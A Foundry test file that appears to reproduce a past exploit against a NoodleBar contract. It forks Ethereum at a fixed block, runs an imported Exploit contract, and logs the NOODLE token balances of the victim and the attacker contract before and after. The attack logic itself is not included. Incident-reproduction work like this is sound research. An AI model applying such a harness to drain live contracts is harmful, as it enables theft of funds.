// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Exploit.sol";

contract ExploitTest is Test {
    Exploit e;
    IERC20 noodle = IERC20(0x2321537fd8EF4644BacDCEec54E5F35bf44311fA);

    function setUp() public {
        vm.createSelectFork(vm.envString("HTTP_URL_ARCHIVE"), 15826379);
        vm.startPrank(address(0xff), address(0xff));

        e = new Exploit();
        console.log("owner %s", e.owner());
    }

    function testExploit() public {
        console.log("noodle balance noodlebar contract %s", noodle.balanceOf(0x3561081260186E69369E6C32F280836554292E08));
        console.log("noodle balance exploit contract %s", noodle.balanceOf(address(e)));

        e.run();
        console.log("exploit.run()");

        console.log("noodle balance noodlebar contract %s", noodle.balanceOf(0x3561081260186E69369E6C32F280836554292E08));
        console.log("noodle balance exploit contract %s", noodle.balanceOf(address(e)));
    }
}